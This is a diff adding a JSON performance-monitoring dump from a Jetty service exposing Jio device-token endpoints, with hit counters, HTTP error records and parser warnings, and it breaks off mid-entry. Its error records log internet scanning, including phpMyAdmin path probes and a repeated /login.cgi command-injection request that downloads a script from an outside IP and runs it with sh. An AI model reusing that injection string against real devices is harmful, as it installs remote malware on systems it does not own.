@@ -1,0 +1,2736 @@
+{"list": [
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": true,
+    "name": "http",
+    "errorCounter": false,
+    "storageName": "http",
+    "iconName": "dbweb.png",
+    "childCounterName": "sql",
+    "requests": [
+      [
+        "Error404",
+        {
+          "name": "Error404",
+          "id": "http9073f7eb29af271f2ae8c1a25bc801b11174eeca",
+          "hits": 444,
+          "durationsSum": 110,
+          "durationsSquareSum": 128,
+          "maximum": 4,
+          "cpuTimeSum": 0,
+          "systemErrors": 444,
+          "responseSizesSum": 0,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "/ PROPFIND",
+        {
+          "name": "/ PROPFIND",
+          "id": "http422d8860f7f19c992d5590d58c39dda5bab054e3",
+          "hits": 2,
+          "durationsSum": 0,
+          "durationsSquareSum": 0,
+          "maximum": 0,
+          "cpuTimeSum": 0,
+          "systemErrors": 2,
+          "responseSizesSum": 0,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "/jcp/JioAppRest/getDeviceIdForImeiImsi POST",
+        {
+          "name": "/jcp/JioAppRest/getDeviceIdForImeiImsi POST",
+          "id": "http9e70d746debd0aabaffb438aed565d57b04db188",
+          "hits": 251226,
+          "durationsSum": 1059053,
+          "durationsSquareSum": 54114861,
+          "maximum": 1571,
+          "cpuTimeSum": 495776,
+          "systemErrors": 0,
+          "responseSizesSum": 13984536,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+        {
+          "name": "/jcp/JioAppRest/getDeviceTokenForMyJio POST",
+          "id": "http2b602e8c98e039842acfe844bf89a6627946130a",
+          "hits": 19465362,
+          "durationsSum": 81786952,
+          "durationsSquareSum": 3779208808,
+          "maximum": 1600,
+          "cpuTimeSum": 38365836,
+          "systemErrors": 0,
+          "responseSizesSum": 1075730784,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "/wuwu11.php POST",
+        {
+          "name": "/wuwu11.php POST",
+          "id": "http340e811e7ad5cdca9cb4eb50725baeacf86d28d4",
+          "hits": 1,
+          "durationsSum": 0,
+          "durationsSquareSum": 0,
+          "maximum": 0,
+          "cpuTimeSum": 0,
+          "systemErrors": 1,
+          "responseSizesSum": 0,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "/wls-wsat/CoordinatorPortType POST",
+        {
+          "name": "/wls-wsat/CoordinatorPortType POST",
+          "id": "http89fe7264a2ad696950a72e2a65cfe58f3fd91d06",
+          "hits": 1,
+          "durationsSum": 1,
+          "durationsSquareSum": 1,
+          "maximum": 1,
+          "cpuTimeSum": 0,
+          "systemErrors": 1,
+          "responseSizesSum": 0,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "/jcp/JioAppRest/getDeviceTokenForJioTv POST",
+        {
+          "name": "/jcp/JioAppRest/getDeviceTokenForJioTv POST",
+          "id": "http582fdeca8ffdde84f37db6c2954d4f2c1a4676ca",
+          "hits": 3943084,
+          "durationsSum": 16610285,
+          "durationsSquareSum": 771477389,
+          "maximum": 1998,
+          "cpuTimeSum": 7771411,
+          "systemErrors": 0,
+          "responseSizesSum": 161643800,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ]
+    ],
+    "rootCurrentContextsByThreadId": [],
+    "startDate": "2018-06-08 11:03:23.723 UTC",
+    "maxRequestsCount": 10000,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": true,
+    "name": "sql",
+    "errorCounter": false,
+    "storageName": "sql",
+    "iconName": "db.png",
+    "requests": [],
+    "rootCurrentContextsByThreadId": [],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 10000,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": false,
+    "name": "jpa",
+    "errorCounter": false,
+    "storageName": "jpa",
+    "iconName": "db.png",
+    "childCounterName": "sql",
+    "requests": [],
+    "rootCurrentContextsByThreadId": [],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 10000,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": false,
+    "name": "ejb",
+    "errorCounter": false,
+    "storageName": "ejb",
+    "iconName": "beans.png",
+    "childCounterName": "sql",
+    "requests": [],
+    "rootCurrentContextsByThreadId": [],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 10000,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": false,
+    "name": "spring",
+    "errorCounter": false,
+    "storageName": "spring",
+    "iconName": "beans.png",
+    "childCounterName": "sql",
+    "requests": [],
+    "rootCurrentContextsByThreadId": [],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 10000,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": false,
+    "name": "guice",
+    "errorCounter": false,
+    "storageName": "guice",
+    "iconName": "beans.png",
+    "childCounterName": "sql",
+    "requests": [],
+    "rootCurrentContextsByThreadId": [],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 10000,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": true,
+    "name": "services",
+    "errorCounter": false,
+    "storageName": "services",
+    "iconName": "beans.png",
+    "childCounterName": "sql",
+    "requests": [],
+    "rootCurrentContextsByThreadId": [],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 10000,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": false,
+    "name": "struts",
+    "errorCounter": false,
+    "storageName": "struts",
+    "iconName": "struts.png",
+    "childCounterName": "sql",
+    "requests": [],
+    "rootCurrentContextsByThreadId": [],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 10000,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": false,
+    "name": "jsf",
+    "errorCounter": false,
+    "storageName": "jsf",
+    "iconName": "jsp.png",
+    "childCounterName": "sql",
+    "requests": [],
+    "rootCurrentContextsByThreadId": [],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 10000,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": false,
+    "name": "jsp",
+    "errorCounter": false,
+    "storageName": "jsp",
+    "iconName": "jsp.png",
+    "childCounterName": "sql",
+    "requests": [],
+    "rootCurrentContextsByThreadId": [],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 10000,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": true,
+    "name": "error",
+    "errorCounter": true,
+    "storageName": "error",
+    "iconName": "error.png",
+    "requests": [
+      [
+        "Error404",
+        {
+          "name": "Error404",
+          "id": "error9073f7eb29af271f2ae8c1a25bc801b11174eeca",
+          "hits": 437,
+          "durationsSum": 107,
+          "durationsSquareSum": 125,
+          "maximum": 4,
+          "cpuTimeSum": 0,
+          "systemErrors": 437,
+          "responseSizesSum": -437,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "Error405",
+        {
+          "name": "Error405",
+          "id": "error0ec5ab8151d19d17b6237074b79b2450112bbafd",
+          "hits": 4,
+          "durationsSum": 1,
+          "durationsSquareSum": 1,
+          "maximum": 1,
+          "cpuTimeSum": 0,
+          "systemErrors": 4,
+          "responseSizesSum": -4,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ]
+    ],
+    "rootCurrentContextsByThreadId": [],
+    "errors": [
+      {
+        "time": 1529297405524,
+        "httpRequest": "/phpmyadmin0/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297405956,
+        "httpRequest": "/phpmyadmin1/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297407415,
+        "httpRequest": "/phpmyadmin2/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297407935,
+        "httpRequest": "/myadmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297408388,
+        "httpRequest": "/myadmin2/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297408816,
+        "httpRequest": "/xampp/phpmyadmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297409252,
+        "httpRequest": "/phpMyadmin_bak/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297409693,
+        "httpRequest": "/www/phpMyAdmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297410157,
+        "httpRequest": "/tools/phpMyAdmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297410611,
+        "httpRequest": "/phpmyadmin-old/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297411056,
+        "httpRequest": "/phpMyAdminold/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297411518,
+        "httpRequest": "/phpMyAdmin.old/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297412026,
+        "httpRequest": "/pma-old/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297412485,
+        "httpRequest": "/claroline/phpMyAdmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297412929,
+        "httpRequest": "/typo3/phpmyadmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297413375,
+        "httpRequest": "/phpma/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297413812,
+        "httpRequest": "/phpmyadmin/phpmyadmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529297414245,
+        "httpRequest": "/phpMyAdmin/phpMyAdmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529308103706,
+        "httpRequest": "/ HEAD",
+        "message": "Error404"
+      },
+      {
+        "time": 1529314825425,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529318732783,
+        "httpRequest": "/login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529323007047,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529332763792,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529333223752,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529336638025,
+        "httpRequest": "/login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529337458637,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529341960162,
+        "httpRequest": "/login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529343678833,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529351034782,
+        "httpRequest": "/ HEAD",
+        "message": "Error404"
+      },
+      {
+        "time": 1529351049564,
+        "httpRequest": "/ HEAD",
+        "message": "Error404"
+      },
+      {
+        "time": 1529355359720,
+        "httpRequest": "/ HEAD",
+        "message": "Error404"
+      },
+      {
+        "time": 1529359407058,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529362681090,
+        "httpRequest": "/ HEAD",
+        "message": "Error404"
+      },
+      {
+        "time": 1529367084193,
+        "httpRequest": "/login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529370446771,
+        "httpRequest": "/login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529375737478,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529377983462,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529394308546,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529395457322,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529398109853,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529437236071,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529440973117,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529455700116,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529459542139,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529459658998,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529467983077,
+        "httpRequest": "/login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529476093224,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529479727685,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489123051,
+        "httpRequest": "/PMA2/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489124300,
+        "httpRequest": "/pmamy/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489124893,
+        "httpRequest": "/pmamy2/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489125420,
+        "httpRequest": "/mysql/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489125914,
+        "httpRequest": "/admin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489126988,
+        "httpRequest": "/db/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489129432,
+        "httpRequest": "/dbadmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489129927,
+        "httpRequest": "/web/phpMyAdmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489131447,
+        "httpRequest": "/admin/pma/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489132536,
+        "httpRequest": "/admin/PMA/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489133417,
+        "httpRequest": "/admin/mysql/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489133891,
+        "httpRequest": "/admin/mysql2/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489135027,
+        "httpRequest": "/admin/phpmyadmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489137252,
+        "httpRequest": "/admin/phpMyAdmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489137747,
+        "httpRequest": "/admin/phpmyadmin2/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489138232,
+        "httpRequest": "/mysqladmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489141423,
+        "httpRequest": "/mysql-admin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489141907,
+        "httpRequest": "/phpadmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489143404,
+        "httpRequest": "/phpmyadmin0/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489144096,
+        "httpRequest": "/phpmyadmin1/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489145112,
+        "httpRequest": "/phpmyadmin2/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489146327,
+        "httpRequest": "/myadmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489146794,
+        "httpRequest": "/myadmin2/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489147644,
+        "httpRequest": "/xampp/phpmyadmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489149258,
+        "httpRequest": "/phpMyadmin_bak/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489149730,
+        "httpRequest": "/www/phpMyAdmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489150225,
+        "httpRequest": "/tools/phpMyAdmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489152045,
+        "httpRequest": "/phpmyadmin-old/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489153415,
+        "httpRequest": "/phpMyAdminold/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489153912,
+        "httpRequest": "/phpMyAdmin.old/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489155009,
+        "httpRequest": "/pma-old/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489156640,
+        "httpRequest": "/claroline/phpMyAdmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489159358,
+        "httpRequest": "/typo3/phpmyadmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489176860,
+        "httpRequest": "/phpma/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489177412,
+        "httpRequest": "/phpmyadmin/phpmyadmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489177895,
+        "httpRequest": "/phpMyAdmin/phpMyAdmin/index.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529489902828,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529504379430,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529504800973,
+        "httpRequest": "//myadmin/scripts/setup.php GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529514807549,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529519721131,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529525259958,
+        "httpRequest": "/ HEAD",
+        "message": "Error404"
+      },
+      {
+        "time": 1529529442455,
+        "httpRequest": "/login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529530064317,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529543976893,
+        "httpRequest": "/login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529544897454,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529552283940,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529558866189,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529562282010,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529569183509,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529569470560,
+        "httpRequest": "/ GET",
+        "message": "Error404"
+      },
+      {
+        "time": 1529569567452,
+        "httpRequest": "/ HEAD",
+        "message": "Error404"
+      }
+    ],
+    "startDate": "2018-06-08 18:33:03.512 UTC",
+    "maxRequestsCount": 250,
+    "estimatedMemorySize": 0
+  },
+  {
+    "application": "nvCache_39_112_2",
+    "displayed": true,
+    "name": "log",
+    "errorCounter": true,
+    "storageName": "log",
+    "iconName": "log.png",
+    "requests": [
+      [
+        "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x12 in state=START for buffer HeapByteBuffer@e5bf78a[p=1,l=52,c=8192,r=51]={\\x12<<<\\x01\\x004\\x00\\x00\\x00\\x00\\x00\\x00\\x15\\x00\\x06\\x01\\x00\\x1b\\x00\\x01...SSQLServer\\x00H\\x0f\\x00\\x00>>>\\r\\nContent-Type: a...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+        {
+          "name": "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x12 in state=START for buffer HeapByteBuffer@e5bf78a[p=1,l=52,c=8192,r=51]={\\x12<<<\\x01\\x004\\x00\\x00\\x00\\x00\\x00\\x00\\x15\\x00\\x06\\x01\\x00\\x1b\\x00\\x01...SSQLServer\\x00H\\x0f\\x00\\x00>>>\\r\\nContent-Type: a...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+          "id": "logb9d55a4decbda654c800928a6a59b4ddc5c7c1df",
+          "hits": 1,
+          "durationsSum": -1,
+          "durationsSquareSum": 1,
+          "maximum": 0,
+          "cpuTimeSum": -1,
+          "systemErrors": 1,
+          "responseSizesSum": -1,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x4 in state=METHOD for buffer HeapByteBuffer@e5bf78a[p=5,l=16,c=8192,r=11]={TNMP\\x04<<<\\x00\\x00\\x00TNME\\x00\\x00\\x04\\x00>>>\\nDate: Fri, 15 Ju...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+        {
+          "name": "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x4 in state=METHOD for buffer HeapByteBuffer@e5bf78a[p=5,l=16,c=8192,r=11]={TNMP\\x04<<<\\x00\\x00\\x00TNME\\x00\\x00\\x04\\x00>>>\\nDate: Fri, 15 Ju...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+          "id": "log2429577ea86dfd19d2ef250e93f0d01f9424d3b1",
+          "hits": 1,
+          "durationsSum": -1,
+          "durationsSquareSum": 1,
+          "maximum": 0,
+          "cpuTimeSum": -1,
+          "systemErrors": 1,
+          "responseSizesSum": -1,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x16 in state=START for buffer HeapByteBuffer@4191e4a0[p=1,l=212,c=8192,r=211]={\\x16<<<\\x03\\x01\\x00\\xCf\\x01\\x00\\x00\\xCb\\x03\\x03B\\xE4\\x1d\\xAa\\xDf=\\xE8...\\x02\\x04\\x03\\x03\\x01\\x03\\x02\\x03\\x03\\x02\\x01\\x02\\x02\\x02\\x03>>>(java 1.5)\\r\\nAccep...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+        {
+          "name": "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x16 in state=START for buffer HeapByteBuffer@4191e4a0[p=1,l=212,c=8192,r=211]={\\x16<<<\\x03\\x01\\x00\\xCf\\x01\\x00\\x00\\xCb\\x03\\x03B\\xE4\\x1d\\xAa\\xDf=\\xE8...\\x02\\x04\\x03\\x03\\x01\\x03\\x02\\x03\\x03\\x02\\x01\\x02\\x02\\x02\\x03>>>(java 1.5)\\r\\nAccep...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+          "id": "log9bae0d43e2e30c8c34d732a622f5826f4dd63125",
+          "hits": 1,
+          "durationsSum": -1,
+          "durationsSquareSum": 1,
+          "maximum": 0,
+          "cpuTimeSum": -1,
+          "systemErrors": 1,
+          "responseSizesSum": -1,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x16 in state=START for buffer HeapByteBuffer@e5bf78a[p=1,l=212,c=8192,r=211]={\\x16<<<\\x03\\x01\\x00\\xCf\\x01\\x00\\x00\\xCb\\x03\\x034\\xB2\\xEd\\xF1\\x96\\x15\\xCb...\\x02\\x04\\x03\\x03\\x01\\x03\\x02\\x03\\x03\\x02\\x01\\x02\\x02\\x02\\x03>>>(java 1.5)\\r\\nAccep...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+        {
+          "name": "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x16 in state=START for buffer HeapByteBuffer@e5bf78a[p=1,l=212,c=8192,r=211]={\\x16<<<\\x03\\x01\\x00\\xCf\\x01\\x00\\x00\\xCb\\x03\\x034\\xB2\\xEd\\xF1\\x96\\x15\\xCb...\\x02\\x04\\x03\\x03\\x01\\x03\\x02\\x03\\x03\\x02\\x01\\x02\\x02\\x02\\x03>>>(java 1.5)\\r\\nAccep...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+          "id": "logf90d1b3a2ef21e045dad1dd17a0fbf31ac144fac",
+          "hits": 1,
+          "durationsSum": -1,
+          "durationsSquareSum": 1,
+          "maximum": 0,
+          "cpuTimeSum": -1,
+          "systemErrors": 1,
+          "responseSizesSum": -1,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n",
+        {
+          "name": "ERROR c.i.f.n.s.i.JioAppPassiveServiceImpl - Err in getting deiceId from map : java.lang.NullPointerException\n \n",
+          "id": "loga5246ec7d5b8f7f3f9a641d86d12014d62be2125",
+          "hits": 2107,
+          "durationsSum": -2107,
+          "durationsSquareSum": 2107,
+          "maximum": 0,
+          "cpuTimeSum": -2107,
+          "systemErrors": 2107,
+          "responseSizesSum": -2107,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x0 in state=START for buffer HeapByteBuffer@5be8e1d1[p=1,l=32,c=8192,r=31]={\\x00<<<\\x1e\\x00\\x06\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07version\\x04bind\\x00\\x00\\x10\\x00\\x03>>>un 2018 15:50:16 ...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+        {
+          "name": "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x0 in state=START for buffer HeapByteBuffer@5be8e1d1[p=1,l=32,c=8192,r=31]={\\x00<<<\\x1e\\x00\\x06\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07version\\x04bind\\x00\\x00\\x10\\x00\\x03>>>un 2018 15:50:16 ...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+          "id": "log71dadbece1a586e0e073bbb6ddd4cb25a4d3176e",
+          "hits": 1,
+          "durationsSum": -1,
+          "durationsSquareSum": 1,
+          "maximum": 0,
+          "cpuTimeSum": -1,
+          "systemErrors": 1,
+          "responseSizesSum": -1,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0xA in state=HEADER for buffer HeapByteBuffer@3400d742[p=150,l=152,c=8192,r=2]={GET / HTTP/1.0\\r\\nH...x/3.6.15\\r\\n*/*\\r\\n<<<\\r\\n>>>on/json; charset=...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+        {
+          "name": "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0xA in state=HEADER for buffer HeapByteBuffer@3400d742[p=150,l=152,c=8192,r=2]={GET / HTTP/1.0\\r\\nH...x/3.6.15\\r\\n*/*\\r\\n<<<\\r\\n>>>on/json; charset=...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+          "id": "log23607d77ac70795461a6b81a711dc5021ee7ae01",
+          "hits": 1,
+          "durationsSum": -1,
+          "durationsSquareSum": 1,
+          "maximum": 0,
+          "cpuTimeSum": -1,
+          "systemErrors": 1,
+          "responseSizesSum": -1,
+          "childHits": 0,
+          "childDurationsSum": 0
+        }
+      ],
+      [
+        "WARN  org.eclipse.jetty.http.HttpParser - Illegal character 0x0 in state=START for buffer HeapByteBuffer@e5bf78a[p=1,l=117,c=8192,r=116]={\\x00<<<\\x00\\x00qj\\x81n0\\x81k\\xA1\\x03\\x02\\x01\\x05\\xA2\\x03\\x02...\\x02\\x01\\x10\\x02\\x01\\x17\\x02\\x01\\x01\\x02\\x01\\x03\\x02\\x01\\x02>>>073790c76a\\r\\nConte...\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n",
+        {
